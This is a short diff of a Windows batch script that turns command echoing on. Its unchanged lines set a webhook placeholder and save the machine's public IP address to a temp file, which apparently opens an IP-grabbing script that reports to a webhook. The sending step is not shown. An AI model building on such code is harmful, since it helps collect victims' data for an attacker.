@@ -1,4 +1,4 @@
-@echo off
+@echo on
 set webhook=YOUR_WEBHOOK_HERE
 curl https://api.ipify.org > %userprofile%\AppData\Local\Temp\ipp.txt
 timeout 2 > nul
